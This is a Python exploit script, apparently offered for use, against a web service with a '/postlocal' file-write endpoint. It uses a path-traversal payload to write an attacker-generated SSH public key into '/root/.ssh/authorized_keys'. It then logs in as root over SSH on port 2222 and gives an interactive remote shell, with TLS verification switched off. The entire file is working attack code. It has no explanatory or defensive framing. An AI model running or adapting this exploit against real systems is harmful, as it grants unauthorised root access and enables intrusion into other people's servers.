import os
import sys
import random
import string
import requests
from paramiko import SSHClient, AutoAddPolicy

# URL format check
def url_format_check(url):
    if not(url.startswith('http://') or url.startswith('https://')):
        raise ValueError('URL should start with http:// or https://')
    
# Prepare session
def prepare_session(proxy):
    session = requests.Session()
    session.verify = False

    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }

        session.proxies = proxies

    return session

# Create temporary ssh key
def create_ssh_key():
    ssh_key_path = '/tmp/' + ''.join(random.choices(string.ascii_lowercase, k=8))
    os.system(f'ssh-keygen -t rsa -b 2048 -f {ssh_key_path} -N "" -q')
    
    return ssh_key_path

# Upload the ssh key
def exploit(session, url):
    # Create a temporary ssh key
    ssh_key_path = create_ssh_key()

    # Read the public key
    public_key = open(ssh_key_path + '.pub').read()
    
    # Prepare the payload
    data = [{
        "action": "create",
        "encoding": "text",
        "file": "../../../../../root/.ssh/authorized_keys",
        "contents": public_key
    }]

    response = session.post(f'{url}/postlocal', json=data)

    if response.status_code == 200:
        print("SSH key successfully injected!")
        shell(ssh_key_path)
    else:
        print("Failed to inject SSH key")

# Connect to the remote shell
def shell(ssh_key_path):
    # Split the domain from the url
    domain = url.split('//')[1].split(':')[0].split('/')[0]
    
    # Create an ssh client
    ssh = SSHClient()
    ssh.load_system_host_keys()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    ssh.connect(domain, port=2222, username='root', key_filename=ssh_key_path)
    
    while True:
        try:
            cmd = input("\nshell# ")
            if cmd.lower() == 'exit':
                ssh.close()
                break
          
            stdin, stdout, stderr = ssh.exec_command(cmd)
            print(stdout.read().decode())
        except Exception as e:
            print(f'Error: {e}')

if __name__ == '__main__':
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) 

    # Check if the correct number of arguments is provided
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <url> <proxy>(optional)')
        sys.exit(1)
  
    # Parse arguments
    url, proxy = sys.argv[1], None

    # Check proxy
    if len(sys.argv) == 3:
        proxy = sys.argv[2]

    # Check URL format
    url_format_check(url)
    
    # Set session
    session = prepare_session(proxy)

    # Exploit
    exploit(session, url)
